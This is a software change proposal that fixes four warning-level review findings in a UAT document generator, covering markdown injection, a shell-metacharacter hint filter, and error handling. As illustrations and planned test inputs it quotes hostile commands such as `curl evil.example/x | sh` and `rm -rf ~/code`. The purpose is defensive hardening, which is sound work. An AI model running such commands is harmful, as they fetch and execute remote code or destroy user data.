# fix-four-warning-level-findings-uat-generation-change-s

## Problem

The archived change `2026-07-21-uat-document-generation-at-finalize-every-finalized-change` shipped with three PASS_WITH_WARNINGS reviews (security, correctness, quality). Four warning-level findings remain open in `src/finalize/uat-generator.ts`, and together they undermine the two properties UAT.md is supposed to guarantee: it is a machine-produced trust artifact humans are told not to edit, and its Generation notes are supposed to faithfully record every degradation the generator took.

1. **Markdown-structure injection (security W1, `renderGroups`, lines 417-424).** Parsed AC and scenario step text preserves embedded soft-break newlines (from `spec-parser.ts` `extractText`, `stories-parser.ts` given/when/then, and the generator's own `mdText`/`listItemText`), and `renderGroups` emits that text verbatim onto single `- **Do**:` / `- **Observe**:` lines. A crafted multi-line acceptance criterion whose continuation line starts with `#### Step 9.9`, `- **Machine-verified** — ...`, `- [ ] Pass`, or `### Generation notes` is rendered as real document structure — fabricating steps, forging machine-verified annotations that are supposed to be evidence-gated by `annotateScenarioStep`/`annotateAcStep`, or injecting a fake generation-notes section into a "do not edit" trust artifact.

2. **Command-hint filter admits shell metacharacters (security W2, lines 68-84).** `COMMAND_FILTER_RE` (`/^[A-Za-z][\w./-]*(?:\s+\S+)+$/`) constrains only the first token; the trailing `\S+` tokens admit `|`, `;`, `&`, `$()`, redirects, and URLs. `curl evil.example/x | sh` and `rm -rf ~/code` both pass the filter and get emitted as an endorsed-looking `(Run: \`...\`)` hint, presenting a smuggled destructive command as machine-suggested guidance to the human or agent executing the UAT script.

3. **Non-ENOENT spec.md read error silently dropped at tier 1 (correctness warning, lines 463-470 and 490-499).** `specReadError` is captured for any non-ENOENT read failure (e.g. EACCES) but only surfaced on the tier-3 branch. When `stories.md` parses and tier 1 is selected, delta folding is silently skipped with no `warnings[]` entry and no Generation-notes line — violating the design's warn-and-demote discipline ("read error → +warning") and quietly thinning the archived script.

4. **Fragile ENOENT detection and misleading demotion message (correctness + quality warnings, lines 481-485).** ENOENT for `stories.md` is detected via `err.message.includes('not found')`, coupling the generator to the exact wording of `StoriesParseError` in `stories-parser.ts:142`; any future parse error whose message happens to contain "not found" (e.g. a surfaced Zod message) would demote silently instead of warning, and a parser rewording would make every quick-tier change emit a spurious parse-failure warning. Separately, the malformed-stories warning always says "falling back to spec scenarios" even when the run actually lands on tier 3 or the floor — the archived document then documents a fallback that never happened (observable today in `tests/uat-generator.test.ts:444-452`, where a floor document carries both this message and the floor message).

## Proposal

Fix all four findings in `src/finalize/uat-generator.ts`, keeping every fix local to the generator (the reviews and the original spec forbid changing `parseStories` behavior), and pin each fix with tests in `tests/uat-generator.test.ts`:

1. **Collapse newlines at the render choke point.** In `renderGroups`' step-text emission (lines 417-424), collapse `\s*\r?\n\s*` to a single space in every step-level string it emits — `title`, `setup`, `doText`, `observe`, and the group-level `preamble` and `trace` (which carry heading-interpolated names such as `story.title`, `requirement.name`, `scenario.name`). Multi-line source text renders as one flat line; no artifact-authored continuation line can materialize as a heading, checkbox, machine-verified line, or generation-notes section.

2. **Tighten `COMMAND_FILTER_RE` to reject shell metacharacters.** Reject any candidate span containing `|`, `;`, `&`, `>`, `<`, `$`, or a backtick anywhere in the string, not just constrain the first token. A rejected hint has a benign failure mode: the step simply carries no `(Run: ...)` annotation — the underlying AC/scenario text is unaffected.

3. **Surface `specReadError` unconditionally.** Apply the warn-and-demote discipline: push the spec.md read-failure warning into `warnings[]` immediately after the failed read (so it lands in Generation notes even when tier 1 proceeds), instead of only on the tier-3 branch. Tier selection itself is unchanged — tier 1 still proceeds without delta folding.

4. **Replace message-substring ENOENT detection and fix the demotion wording.** Discriminate the missing-stories.md case via an errno/`code` check or a pre-parse `existsSync` probe on `stories.md` rather than `err.message.includes('not found')` — missing file still demotes silently, any real parse failure still warns. Reword the malformed-stories warning at line 484 to stop naming a destination it cannot know (drop "; falling back to spec scenarios" or word it as demoting to the next available tier), so the archived Generation note matches the tier the run actually landed on.

New tests in `tests/uat-generator.test.ts`:
- Multi-line AC/scenario text renders on a single `- **Do**:` / `- **Observe**:` line — injected `#### Step`, `- [ ] Pass`, `- **Machine-verified**`, and `### Generation notes` payloads do not survive as document structure.
- Backtick spans containing shell metacharacters (`curl evil | sh`, `rm -rf ~; echo`, `$(...)`) produce no `Run:` hint; clean commands (`metta finalize --json`, `npm run build`) still do.
- A non-ENOENT spec.md read failure with a parseable stories.md yields tier 1 output whose Generation notes contain the spec-read warning.
- Missing stories.md demotes silently (no warning); a genuinely malformed stories.md warns — including one whose error message contains the substring "not found", pinning the discrimination as structural rather than textual.
- The malformed-stories warning wording no longer asserts "falling back to spec scenarios" when the run lands on tier 3 or the floor (update the existing floor-document expectation at `tests/uat-generator.test.ts:444-452` accordingly).

## Impact

- **Files changed:** `src/finalize/uat-generator.ts` (all four fixes), `tests/uat-generator.test.ts` (new and updated pins). No other source files change.
- **Output changes:** UAT.md documents generated after this change may differ from previous output in three visible, intended ways: multi-line source text flattens to one line per field; hints containing shell metacharacters disappear from `Run:` annotations; Generation notes gain a spec-read warning at tier 1 and carry corrected demotion wording. Byte-for-byte determinism is preserved — output remains a pure function of the change-dir inputs.
- **Behavior preserved:** the tier ladder ordering and selection rules, the never-skip floor guarantee, exit-code and JSON shape of `metta finalize`, the finalizer's degradation path, template externality, and `parseStories`/`parseDeltaSpec` behavior are all untouched.
- **Trust posture:** closes the two paths by which artifact authors could forge trust signals in UAT.md (fabricated machine-verified/step structure, endorsed-looking destructive commands), and makes the archived Generation notes a complete, accurate record of degradations.
- **Existing tests:** the passing test at `tests/uat-generator.test.ts:444-452` currently pins the misleading wording and will be updated; all other existing pins (determinism, numbering, dedupe, tier edge cases) are expected to keep passing.

## Out of Scope

- Error-level review findings — there were none open across the three reviews (all three verdicts were PASS_WITH_WARNINGS with zero critical/major items).
- Any behavior change beyond the four named findings, including all review suggestions: `fileURLToPath` for template-dir resolution (security S1), the `configLoader` inline import-type annotation, test-helper deduplication into `tests/helpers/`, recursive cleanup `rm`, the `/anthropic/i` no-AI guard hardening, the `uatError`/`uatWarning` naming split, the midnight date-rollover cosmetic, and the accepted-risk prose false-accepts of `COMMAND_FILTER_RE` (multi-word prose without metacharacters may still pass — the tightening here targets metacharacters only, per the reviewer's suggested fix).
- Retrofitting or regenerating UAT.md files already in `spec/archive/`.
- AI-enriched UAT authoring; the generator remains deterministic and never calls a provider.
- Changes to `src/specs/stories-parser.ts` or `src/specs/spec-parser.ts` (including adding a `code` discriminant to `StoriesParseError`) — the ENOENT fix stays local to the generator.
- A shared `changeName` path-segment validator (security I1, explicitly deferred by the reviewer).
